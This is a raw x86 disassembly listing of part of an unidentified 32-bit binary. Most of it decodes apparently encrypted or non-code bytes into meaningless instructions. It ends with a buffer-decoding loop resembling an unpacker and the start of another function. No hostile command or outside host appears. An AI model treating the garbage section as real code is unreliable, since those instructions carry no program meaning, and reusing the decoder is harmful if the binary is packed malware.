  420e2e:	mov    bh,0x82
  420e30:	fsub   DWORD PTR [esi-0x7852dded]
  420e36:	je     0x420dc1
  420e38:	add    ebp,DWORD PTR [ecx]
  420e3a:	or     DWORD PTR gs:[eax-0x41db8073],ecx
  420e41:	pop    edi
  420e42:	dec    ecx
  420e43:	mov    ecx,0x71be6dd9
  420e48:	or     al,0x27
  420e4a:	ins    DWORD PTR es:[edi],dx
  420e4b:	popa   
  420e4c:	cwde   
  420e4d:	xor    al,0x6b
  420e4f:	cwde   
  420e50:	test   DWORD PTR [ebp+0x75],ecx
  420e53:	push   ebx
  420e54:	mov    esp,0xca6b8077
  420e59:	xchg   esi,eax
  420e5a:	popf   
  420e5b:	xchg   esi,eax
  420e5c:	add    eax,0x4691879
  420e61:	loope  0x420ee2
  420e63:	dec    dl
  420e65:	(bad)  
  420e67:	out    0xa9,eax
  420e69:	add    edx,DWORD PTR [eax+0x22]
  420e6c:	hlt    
  420e6d:	aam    0xc9
  420e6f:	ds (bad) 
  420e72:	adc    al,0x18
  420e74:	retf   
  420e75:	inc    ebx
  420e76:	cmp    DWORD PTR [ebx],0xd39b22ce
  420e7c:	repnz add al,cl
  420e7f:	(bad)  
  420e80:	sbb    ah,dl
  420e82:	jo     0x420ec6
  420e84:	(bad)  
  420e86:	inc    esi
  420e87:	out    0x99,al
  420e89:	(bad)  [ebp-0x20]
  420e8c:	inc    ebx
  420e8d:	mov    BYTE PTR [ebx],ah
  420e8f:	(bad)  
  420e90:	jmp    0x420ed9
  420e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e93:	loope  0x420e3c
  420e95:	xlat   BYTE PTR ds:[ebx]
  420e96:	sub    edi,DWORD PTR [edx+0x36]
  420e99:	in     eax,dx
  420e9a:	sbb    ecx,DWORD PTR [esi]
  420e9c:	sub    BYTE PTR ds:0xc0ba10ad,0x3e
  420ea3:	pop    ds
  420ea4:	jae    0x420ec9
  420ea6:	pop    edi
  420ea7:	aam    0x17
  420ea9:	pop    edi
  420eaa:	call   0x44f24bb6
  420eaf:	mov    ds:0xa97e81e4,eax
  420eb4:	fcomp  DWORD PTR [edi+0x5d]
  420eb7:	jns    0x420ed0
  420eb9:	hlt    
  420eba:	push   0x13
  420ebc:	mov    dh,0x1c
  420ebe:	adc    DWORD PTR [edi],ebp
  420ec0:	loopne 0x420ed2
  420ec2:	(bad)  
  420ec3:	lahf   
  420ec4:	ss pop ebx
  420ec6:	jp     0x420e8b
  420ec8:	inc    ecx
  420ec9:	pop    ss
  420eca:	mov    ds:0x1964ee1d,eax
  420ecf:	dec    eax
  420ed0:	sbb    eax,0x2e840097
  420ed5:	neg    DWORD PTR ds:0xf0023fcb
  420edb:	or     eax,esp
  420edd:	sbb    ebx,DWORD PTR [eax]
  420edf:	shl    BYTE PTR [eax-0x80],0x9
  420ee3:	push   edi
  420ee4:	lods   eax,DWORD PTR ds:[esi]
  420ee5:	ret    
  420ee6:	int    0xd1
  420ee8:	sub    eax,0xcfc6b8e1
  420eed:	mov    edi,0xd0aa28f6
  420ef2:	mov    edi,DWORD PTR [ebp-0xd]
  420ef5:	inc    eax
  420ef6:	les    edi,FWORD PTR [esi]
  420ef8:	jns    0x420f6f
  420efa:	scas   al,BYTE PTR es:[edi]
  420efb:	(bad)
  420eff:	jmp    0x420f5e
  420f01:	rcl    DWORD PTR ds:0xfff4e2c3,1
  420f07:	cmovg  esi,DWORD PTR [eax-0x3103631b]
  420f0e:	aam    0xc4
  420f10:	cmp    al,0x73
  420f12:	mov    esi,0x64a92a84
  420f17:	sub    DWORD PTR [ebp-0x74],esi
  420f1a:	xor    bh,cl
  420f1c:	push   esp
  420f1d:	xor    eax,0x2c66fff
  420f22:	inc    ebp
  420f23:	call   0x2487bc17
  420f28:	enter  0x75ad,0xcf
  420f2c:	into   
  420f2d:	sar    DWORD PTR [eax],1
  420f2f:	sub    bl,BYTE PTR [edx-0x42]
  420f32:	jbe    0x420f8d
  420f34:	mov    ebp,0x533f9d7f
  420f39:	pop    es
  420f3a:	enter  0xac78,0x1
  420f3e:	into   
  420f3f:	lea    edx,[ebx+0x7a]
  420f42:	lods   al,BYTE PTR ds:[esi]
  420f43:	in     al,dx
  420f44:	push   ebx
  420f45:	out    0x8e,eax
  420f47:	xor    al,0x93
  420f49:	mov    al,ds:0xbd397cb7
  420f4e:	push   ecx
  420f4f:	adc    BYTE PTR [ebp+0x7c45138d],cl
  420f55:	or     DWORD PTR [edx],0xfc42b5ce
  420f5b:	jne    0x420ef5
  420f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f5e:	out    0xbc,eax
  420f60:	hlt    
  420f61:	bound  esi,QWORD PTR [ecx+eiz*2]
  420f64:	push   es
  420f65:	fldcw  WORD PTR [ecx+0x5]
  420f69:	jl     0x420f8f
  420f6b:	(bad)  
  420f6d:	add    BYTE PTR [ecx+0x6cc8ea60],0xc4
  420f74:	push   ebx
  420f75:	push   esi
  420f76:	push   ds
  420f77:	or     al,0xc
  420f79:	in     al,dx
  420f7a:	neg    DWORD PTR [edi]
  420f7c:	sub    ah,BYTE PTR [edi-0x37bc4d87]
  420f82:	jnp    0x420f24
  420f84:	nop
  420f85:	mov    edi,0xd2977a87
  420f8a:	lods   eax,DWORD PTR ds:[esi]
  420f8b:	pop    esi
  420f8c:	jecxz  0x420f9a
  420f8e:	out    dx,eax
  420f8f:	mov    bh,0x82
  420f91:	xchg   esi,eax
  420f92:	jbe    0x420f3d
  420f94:	pop    ss
  420f95:	jnp    0x420f9b
  420f97:	test   BYTE PTR [esi+0x52],0x93
  420f9b:	dec    ebx
  420f9c:	sbb    al,0xf2
  420f9e:	mov    ecx,0x5d635e79
  420fa3:	lds    edi,FWORD PTR [ecx+0x63]
  420fa6:	mov    ds:0x3c79657c,al
  420fab:	mov    ecx,DWORD PTR [esp+ebp*2+0x23520e5c]
  420fb2:	or     eax,0xa1b27389
  420fb7:	jmp    0x420f5f
  420fb9:	sub    bh,dl
  420fbb:	pop    es
  420fbc:	pusha  
  420fbd:	in     eax,0xc9
  420fbf:	xchg   DWORD PTR [eax-0x5a],eax
  420fc2:	xchg   DWORD PTR [ebx-0x3d16140],ebp
  420fc8:	pop    esi
  420fc9:	mov    edx,0x8cc0b71a
  420fce:	jno    0x420fef
  420fd0:	jl     0x420f76
  420fd2:	jmp    0x421000
  420fd4:	xchg   esp,eax
  420fd5:	sub    edx,DWORD PTR [esi]
  420fd7:	sub    ecx,DWORD PTR [ecx+0x77]
  420fda:	lods   al,BYTE PTR ds:[esi]
  420fdb:	(bad)  
  420fdc:	pop    edx
  420fdd:	jnp    0x420f8c
  420fdf:	mov    bh,0x1d
  420fe1:	dec    ebx
  420fe2:	frstor [ecx+0x3b]
  420fe5:	and    dh,ah
  420fe7:	mov    edx,0x4c7b26e6
  420fec:	jae    0x42104c
  420fee:	mov    esi,0x3192715b
  420ff3:	inc    esi
  420ff4:	xor    ah,bh
  420ff6:	or     al,0x33
  420ff8:	aad    0xd1
  420ffa:	ins    BYTE PTR es:[edi],dx
  420ffb:	(bad)  
  420ffc:	repz xchg esp,eax
  420ffe:	aaa    
  420fff:	push   esi
  421000:	jno    0x420fbc
  421002:	mov    ecx,0xf9c16505
  421007:	in     eax,0x59
  421009:	xor    al,0x7b
  42100b:	(bad)  
  42100c:	out    dx,eax
  42100d:	xor    al,0xce
  42100f:	not    DWORD PTR [edi+edi*8]
  421012:	dec    DWORD PTR [ebp-0x45]
  421015:	push   edi
  421016:	xchg   ecx,eax
  421017:	jmp    0x23e09919
  42101c:	rol    DWORD PTR [ebx],0x39
  42101f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421020:	aaa    
  421021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421022:	xor    eax,0xf58fc800
  421027:	and    BYTE PTR [edx],cl
  421029:	mov    al,0xe6
  42102b:	int    0x5e
  42102d:	jno    0x420fb3
  42102f:	pushf  
  421030:	add    bh,bh
  421032:	xchg   esp,eax
  421033:	sub    DWORD PTR [eax],ecx
  421035:	mov    al,ds:0x9f12ccc1
  42103a:	aam    0xb5
  42103c:	fs mov ecx,0x67cbce77
  421042:	shl    BYTE PTR [edx-0x18],cl
  421045:	sbb    cl,BYTE PTR [edi+ecx*1+0x1a]
  421049:	popf   
  42104a:	push   eax
  42104b:	inc    esi
  42104c:	test   eax,0x26e87641
  421051:	mov    esi,0x866ddb2e
  421056:	or     DWORD PTR [ecx-0x6cc7f904],esi
  42105c:	xchg   ebp,eax
  42105d:	mov    bl,0xd9
  42105f:	cmp    eax,0x6b71c3cd
  421064:	sbb    ah,bl
  421066:	adc    al,al
  421068:	inc    ebx
  421069:	or     al,0x7c
  42106b:	pop    ss
  42106c:	ja     0x421058
  42106e:	mov    dl,0x46
  421070:	es inc eax
  421072:	add    eax,0x2c803396
  421077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421078:	cmp    dh,BYTE PTR [eax]
  42107a:	fadd   QWORD PTR [eax]
  42107c:	add    eax,0xfee4f716
  421081:	fsub   QWORD PTR [esp+edx*1-0x25]
  421085:	adc    BYTE PTR [ebx-0x4],dh
  421088:	sbb    al,0x85
  42108a:	repz sub DWORD PTR [ebx],esi
  42108d:	xor    edx,edx
  42108f:	adc    eax,DWORD PTR [ebx-0x20]
  421092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421093:	dec    ebx
  421094:	adc    al,0x39
  421096:	cs aas 
  421098:	retf   
  421099:	push   es
  42109a:	test   eax,0xe5cc21f4
  42109f:	iret   
  4210a0:	mov    ds:0xc40f5a94,eax
  4210a5:	jle    0x421098
  4210a7:	aaa    
  4210a8:	loope  0x421057
  4210aa:	neg    DWORD PTR [ebp+0x39afb772]
  4210b0:	mov    ecx,ebp
  4210b2:	rol    BYTE PTR [edi+ecx*1],0x23
  4210b6:	mov    esi,0x3be67da
  4210bb:	cmp    ebx,DWORD PTR [ecx]
  4210bd:	add    esi,DWORD PTR [edi+0x415a3f39]
  4210c3:	int    0x8f
  4210c5:	rcr    BYTE PTR [edx],0x78
  4210c8:	jg     0x421136
  4210ca:	or     cl,BYTE PTR [eax+ebp*8-0x71]
  4210ce:	in     al,0x54
  4210d0:	jg     0x421126
  4210d2:	int3   
  4210d3:	out    0x8d,eax
  4210d5:	mov    esi,0xf0e6d9d7
  4210da:	cdq    
  4210db:	mov    ds:0x699192a4,eax
  4210e0:	add    eax,0x261ff8be
  4210e5:	das    
  4210e6:	dec    ebx
  4210e7:	add    esp,DWORD PTR [di+0x4]
  4210eb:	xor    cl,BYTE PTR [edi]
  4210ed:	aaa    
  4210ee:	pusha  
  4210ef:	neg    BYTE PTR [esi-0x3be9230e]
  4210f5:	cdq    
  4210f6:	imul   edx,eax,0x362f3aeb
  4210fc:	mov    eax,ds:0xb680feb6
  421101:	pop    ds
  421102:	xchg   esi,eax
  421103:	pop    esi
  421104:	cli    
  421105:	aaa    
  421106:	jae    0x4210f2
  421108:	pop    eax
  421109:	into   
  42110a:	push   0xf24bf5f9
  42110f:	xor    eax,DWORD PTR [esi-0x19]
  421112:	test   al,0xd2
  421114:	xchg   esp,eax
  421115:	not    DWORD PTR [ebx]
  421117:	in     eax,dx
  421118:	push   eax
  421119:	rol    ah,1
  42111b:	xor    eax,0x13b6b49b
  421120:	mov    BYTE PTR [edi+0x64c009f2],dh
  421126:	movsx  ebp,WORD PTR [ebx+eax*2-0x29cb087f]
  42112e:	pop    edx
  42112f:	outs   dx,BYTE PTR ds:[esi]
  421130:	push   ebp
  421131:	jns    0x4210cd
  421133:	call   0xe25:0x33e94c0
  42113a:	fmul   QWORD PTR [esi]
  42113c:	push   esi
  42113d:	cmp    al,0x7
  42113f:	int3   
  421140:	mov    dl,0x7c
  421142:	ja     0x421145
  421144:	cmp    eax,0x90ef6fb6
  421149:	popa   
  42114a:	cwde   
  42114b:	fwait
  42114c:	xor    eax,0x219a7283
  421151:	and    bl,ch
  421153:	xor    bl,0xe5
  421156:	adc    eax,0x1c9d5218
  42115b:	scas   eax,DWORD PTR es:[edi]
  42115c:	cs pop esp
  42115e:	std    
  42115f:	push   ecx
  421160:	cwde   
  421161:	sub    eax,0xb4f94418
  421166:	push   ecx
  421167:	ins    BYTE PTR es:[edi],dx
  421168:	dec    esi
  421169:	scas   al,BYTE PTR es:[edi]
  42116a:	pop    ecx
  42116b:	je     0x421153
  42116d:	xor    edi,DWORD PTR [eax]
  42116f:	sbb    BYTE PTR [ecx],al
  421171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421172:	adc    bl,ch
  421174:	cmove  edi,DWORD PTR [edi-0x45a3dfaf]
  42117b:	lea    esp,[esi+0xa]
  42117e:	push   ds
  42117f:	pop    ss
  421180:	mov    ecx,0x5accd13a
  421185:	sbb    al,0x3
  421187:	and    ebp,esp
  421189:	mov    ds:0x4dd2a400,eax
  42118e:	sbb    bl,BYTE PTR [edx-0x1]
  421191:	dec    ebx
  421192:	in     al,dx
  421193:	push   ds
  421194:	xchg   edi,eax
  421195:	mov    ds:0xdeb5292b,eax
  42119a:	lea    eax,[ecx+0x446cc03]
  4211a0:	lock cmp al,BYTE PTR [edi+0x7f4ab409]
  4211a7:	test   eax,0xce8e2a69
  4211ac:	(bad)  
  4211ad:	ds xor edi,eax
  4211b0:	clc    
  4211b1:	mov    eax,0x804da6b9
  4211b6:	pusha  
  4211b7:	mov    DWORD PTR [ebp-0x51a08131],esi
  4211bd:	out    0xaf,al
  4211bf:	(bad)  
  4211c0:	lea    edx,[esi]
  4211c2:	sbb    al,0x8c
  4211c4:	nop
  4211c5:	xor    al,BYTE PTR [ebp-0x59]
  4211c8:	jl     0x4211d1
  4211ca:	jl     0x421185
  4211cc:	dec    esp
  4211cd:	dec    esi
  4211ce:	sbb    esi,ebx
  4211d0:	mov    dh,0x75
  4211d2:	ror    bh,0xbc
  4211d5:	mov    esi,0x5338b327
  4211da:	push   ss
  4211db:	and    edx,DWORD PTR [edx]
  4211dd:	xchg   DWORD PTR [edx+0x7849ca84],ebx
  4211e3:	mov    ecx,0xc0416be9
  4211e8:	ret    0x30b9
  4211eb:	mov    ch,0xea
  4211ed:	test   al,0xab
  4211ef:	ja     0x42120d
  4211f1:	shl    BYTE PTR [edx-0x6dc9738b],0x14
  4211f8:	inc    ebx
  4211f9:	scas   eax,DWORD PTR es:[edi]
  4211fa:	adc    DWORD PTR [ecx-0x70b3ef7],ebx
  421200:	xchg   ebp,eax
  421201:	or     DWORD PTR [eax],0x4bb62066
  421207:	mov    ds:0xbf41151e,eax
  42120c:	lods   eax,DWORD PTR ds:[esi]
  42120d:	inc    eax
  42120e:	push   esp
  42120f:	jns    0x421252
  421211:	dec    edi
  421212:	xchg   edi,eax
  421213:	sub    DWORD PTR [eax-0x47],eax
  421216:	mov    cl,0xcc
  421218:	xchg   esp,eax
  421219:	cld    
  42121a:	std    
  42121b:	lods   eax,DWORD PTR ds:[esi]
  42121c:	inc    edi
  42121d:	fstp   DWORD PTR [esi-0x3e]
  421220:	push   edx
  421221:	popf   
  421222:	mov    al,0x99
  421224:	mov    eax,0xbb2b911d
  421229:	(bad)  
  42122a:	idiv   BYTE PTR [esi+ebp*4+0x28]
  42122e:	inc    ecx
  42122f:	sbb    al,0xe
  421231:	sti    
  421232:	in     eax,0xfb
  421234:	mov    esi,0x2715e417
  421239:	mov    bh,0xbe
  42123b:	cld    
  42123c:	mov    dh,0x73
  42123e:	lahf   
  42123f:	cwde   
  421240:	test   eax,0x2a90e9ae
  421245:	fs sub esp,ebx
  421248:	inc    eax
  421249:	into   
  42124a:	cmp    cl,al
  42124c:	mov    ebx,0xddf6c3db
  421251:	enter  0x8ff1,0x54
  421255:	mov    edi,0xdd9dc5f1
  42125a:	leave  
  42125b:	jns    0x4212d8
  42125d:	lods   al,BYTE PTR ds:[esi]
  42125e:	mov    ecx,ebx
  421260:	jo     0x421214
  421262:	sub    edi,DWORD PTR [edx+0x3e9dc737]
  421268:	sar    edx,cl
  42126a:	mov    eax,ds:0x3b9d6bd9
  42126f:	pop    esp
  421270:	lahf   
  421271:	dec    esi
  421272:	shl    BYTE PTR [ebx-0x3d8aec3f],0xaf
  421279:	sub    DWORD PTR gs:[ebp+0x20c99b21],edi
  421280:	jp     0x4212ef
  421282:	(bad)  
  421283:	lds    eax,FWORD PTR [esi]
  421285:	adc    DWORD PTR [edx-0x63],edi
  421288:	adc    bh,ch
  42128a:	(bad)  [edi-0xf23858b]
  421290:	aam    0x41
  421292:	pop    edi
  421293:	or     ebp,ecx
  421295:	das    
  421296:	pop    es
  421297:	pop    es
  421298:	or     DWORD PTR [ecx-0x32e0f054],ebp
  42129e:	cmp    esi,DWORD PTR [ecx+0x3d]
  4212a1:	retf   
  4212a2:	dec    ebp
  4212a3:	pop    esp
  4212a4:	push   0xffffff9f
  4212a6:	int    0x19
  4212a8:	xor    esi,DWORD PTR [eax-0x7a8bb95f]
  4212ae:	xchg   ecx,eax
  4212af:	sbb    BYTE PTR [ebp-0x38],cl
  4212b2:	mov    ch,0xc
  4212b4:	jno    0x42131f
  4212b6:	out    dx,eax
  4212b7:	mov    cl,0xb9
  4212b9:	cmp    bl,dl
  4212bb:	jg     0x42128e
  4212bd:	imul   DWORD PTR [edx+0x4b3f3b00]
  4212c3:	mov    esp,0xd4f67c7e
  4212c8:	xchg   ecx,eax
  4212c9:	inc    edi
  4212ca:	xchg   edx,eax
  4212cb:	fidiv  DWORD PTR [ebx]
  4212cd:	lods   al,BYTE PTR ds:[esi]
  4212ce:	xchg   esp,eax
  4212cf:	inc    ebp
  4212d0:	stc    
  4212d1:	ins    BYTE PTR es:[edi],dx
  4212d2:	cmp    DWORD PTR [ebx+ecx*1-0x3f],eax
  4212d6:	pop    ds
  4212d7:	arpl   sp,ax
  4212d9:	fucomi st,st(4)
  4212db:	jae    0x421283
  4212dd:	(bad)  
  4212de:	fbstp  TBYTE PTR [edi+0x380c0c46]
  4212e4:	jg     0x42133b
  4212e6:	xor    edx,DWORD PTR [ecx]
  4212e8:	xchg   esp,eax
  4212e9:	inc    eax
  4212ea:	nop
  4212eb:	bound  esi,QWORD PTR [ecx+0x61]
  4212ee:	mov    esp,0x908b5edc
  4212f3:	push   ebp
  4212f4:	js     0x4212dc
  4212f6:	sub    WORD PTR [ecx+ebp*1-0x67],0xffa8
  4212fc:	call   0x6ebd:0x795afcbb
  421303:	jle    0x4212df
  421305:	xlat   BYTE PTR ds:[ebx]
  421306:	aaa    
  421307:	jbe    0x421315
  421309:	mov    cl,0x6b
  42130b:	xor    al,0x4b
  42130d:	stos   DWORD PTR es:[edi],eax
  42130e:	mov    bh,BYTE PTR [eax-0x42fd2a0f]
  421314:	cmp    ebp,DWORD PTR [edi]
  421316:	jecxz  0x421334
  421318:	lds    esp,FWORD PTR [ebx+0x1a]
  42131b:	test   eax,0xc986d9c
  421320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421321:	add    ebp,DWORD PTR [edi+ecx*4]
  421324:	jle    0x421325
  421326:	cmp    BYTE PTR [ecx+0x572eb9f6],ch
  42132c:	push   ss
  42132d:	xor    DWORD PTR [ecx-0x9],esi
  421330:	aaa    
  421331:	into   
  421332:	jo     0x421322
  421334:	shl    esi,0x80
  421337:	call   0xe54e:0xaddd5158
  42133e:	push   edi
  42133f:	div    ah
  421341:	leave  
  421342:	mov    ecx,0x246ec104
  421347:	fadd   QWORD PTR [edi]
  421349:	xor    BYTE PTR [esi+0x3f],0x6e
  42134d:	add    eax,0x1c4cce29
  421352:	stos   BYTE PTR es:[edi],al
  421353:	add    eax,0x13d32daa
  421358:	loop   0x42137a
  42135a:	lock xor BYTE PTR [edi+edx*1],ah
  42135e:	mov    ecx,0xd5f16712
  421363:	sub    ah,BYTE PTR [esi-0x1cab46e2]
  421369:	jecxz  0x42133c
  42136b:	xchg   ecx,eax
  42136c:	out    dx,eax
  42136d:	les    eax,FWORD PTR [esi]
  42136f:	stc    
  421370:	jo     0x4213b9
  421372:	push   ds
  421373:	fnstsw WORD PTR [ebx+edi*1+0x4d]
  421377:	stos   DWORD PTR es:[edi],eax
  421378:	outs   dx,BYTE PTR ds:[esi]
  421379:	fnstenv [edx-0x61]
  42137c:	popf   
  42137d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42137e:	mov    bp,0xa6ca
  421382:	or     esp,ebp
  421384:	call   0xdfd5:0xaa81b9a6
  42138b:	cli    
  42138c:	jecxz  0x42135b
  42138e:	gs sub eax,0x9054e891
  421394:	xchg   edi,eax
  421395:	shl    cl,1
  421397:	lods   eax,DWORD PTR ds:[esi]
  421398:	jno    0x42133a
  42139a:	push   edi
  42139b:	mov    esi,eax
  42139d:	leave  
  42139e:	mov    ebx,0x259418e1
  4213a3:	jbe    0x42133b
  4213a5:	test   DWORD PTR [eax],eax
  4213a7:	add    eax,DWORD PTR [edx+0xd847a04]
  4213ad:	imul   ebp,DWORD PTR [ebx],0x71
  4213b0:	or     al,0x6e
  4213b2:	xor    BYTE PTR [edi+edi*1],bl
  4213b5:	inc    ebx
  4213b6:	cmp    BYTE PTR [edx-0x65],al
  4213b9:	add    dh,BYTE PTR [ebx-0x4a]
  4213bc:	sub    al,cl
  4213be:	aam    0x11
  4213c0:	and    bh,bh
  4213c2:	sub    eax,0x68f6af32
  4213c7:	in     eax,0xd9
  4213c9:	imul   edi,DWORD PTR [ecx],0xffffffa6
  4213cc:	fwait
  4213cd:	sbb    eax,0x8bc9223b
  4213d2:	mov    al,0xf9
  4213d4:	push   ebx
  4213d5:	xor    ebx,DWORD PTR [edi+0xd69feb2]
  4213db:	pop    ds
  4213dc:	sbb    dl,bh
  4213de:	adc    al,0xeb
  4213e0:	push   ss
  4213e1:	dec    ebp
  4213e2:	clc    
  4213e3:	adc    DWORD PTR [ecx+0x2bf4cb92],edx
  4213e9:	lock shl BYTE PTR [ebx+0x610f6db9],1
  4213f0:	jmp    0x45ae:0xd8c42adb
  4213f7:	jne    0x421390
  4213f9:	add    eax,0x3bf3ad48
  4213fe:	pushf  
  4213ff:	paddusb mm3,mm6
  421402:	jmp    0x4213d1
  421404:	push   eax
  421405:	fwait
  421406:	mov    esi,0x9f57a54c
  42140b:	push   ss
  42140c:	push   ds
  42140d:	scas   al,BYTE PTR es:[edi]
  42140e:	push   esp
  42140f:	dec    ebp
  421410:	nop
  421411:	scas   eax,DWORD PTR es:[edi]
  421412:	sub    eax,0x66f00e93
  421417:	and    eax,0xb79946fb
  42141c:	mov    ecx,0x9542e798
  421421:	(bad)  
  421422:	mov    cl,0x1a
  421424:	fcmovne st,st(3)
  421426:	xchg   edx,eax
  421427:	sub    al,0x4e
  421429:	xlat   BYTE PTR ds:[ebx]
  42142a:	jae    0x421459
  42142c:	dec    ebx
  42142d:	scas   eax,DWORD PTR es:[edi]
  42142e:	fld    TBYTE PTR [ecx]
  421430:	in     al,0x71
  421432:	mov    edi,0x1e830cde
  421437:	stos   DWORD PTR es:[edi],eax
  421438:	in     eax,dx
  421439:	int    0xa0
  42143b:	pop    edx
  42143c:	test   ch,0xe9
  42143f:	inc    esi
  421440:	sub    eax,0x64251a28
  421445:	push   ss
  421446:	fnstenv [ecx-0x18]
  421449:	imul   ebx,DWORD PTR [ebx+ebx*8],0xf6559394
  421450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421451:	push   cs
  421452:	lds    edi,FWORD PTR [eax+esi*2+0x34054862]
  421459:	xchg   esi,eax
  42145a:	mov    eax,ds:0xe762253f
  42145f:	sbb    al,0x6b
  421461:	dec    ecx
  421462:	out    dx,eax
  421463:	call   0x3926bde0
  421468:	and    al,0x3d
  42146a:	and    ch,bl
  42146c:	and    DWORD PTR [edx+0x77],ebx
  42146f:	xchg   DWORD PTR [ebx],ecx
  421471:	out    0x7c,eax
  421473:	shl    DWORD PTR [eax+0x6861de48],cl
  421479:	jl     0x4214ea
  42147b:	pop    ebx
  42147c:	xchg   BYTE PTR [ecx+ebx*4+0x5743012b],ah
  421483:	gs out 0xb,eax
  421486:	xchg   ecx,eax
  421487:	sub    bh,ah
  421489:	aam    0xcb
  42148b:	xor    BYTE PTR [ecx+0x3d],bl
  42148e:	nop
  42148f:	xor    ch,BYTE PTR [edi-0x5e]
  421492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421493:	in     eax,dx
  421494:	rol    DWORD PTR [ebx],1
  421496:	jmp    0x42148e
  421498:	das    
  421499:	push   edx
  42149a:	xchg   esp,eax
  42149b:	out    dx,al
  42149c:	psubsb mm6,QWORD PTR [eax+0x4]
  4214a0:	inc    edx
  4214a1:	cwde   
  4214a2:	into   
  4214a3:	jae    0x42150d
  4214a5:	sub    al,0x6e
  4214a7:	or     ch,BYTE PTR [ecx+eax*8]
  4214aa:	and    eax,0xfc17582a
  4214af:	cmp    eax,0x3caa616
  4214b4:	jno    0x421522
  4214b6:	inc    esi
  4214b7:	push   edi
  4214b8:	arpl   WORD PTR [edi],sp
  4214ba:	add    al,0x5a
  4214bc:	imul   ebp,DWORD PTR [esi+0x2ebcfa6f],0x10dd4b78
  4214c6:	xor    ebp,ebx
  4214c8:	fnstenv [ebx]
  4214ca:	rol    bl,0x90
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428100
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428104
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428108
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42810c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f0
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280f4
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x4280f8
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x4280fc
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x4280fe
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	cmp    DWORD PTR [ebp+0x8],0x0
  421630:	jne    0x42163b
  421632:	mov    eax,DWORD PTR [ebp-0x10]
  421635:	add    eax,0x1
  421638:	mov    DWORD PTR [ebp-0x10],eax
  42163b:	mov    DWORD PTR [ebp-0x48],0x0
  421642:	mov    DWORD PTR [ebp-0x4c],0x0
  421649:	push   0x1
  42164b:	lea    ecx,[ebp-0x14]
  42164e:	push   ecx
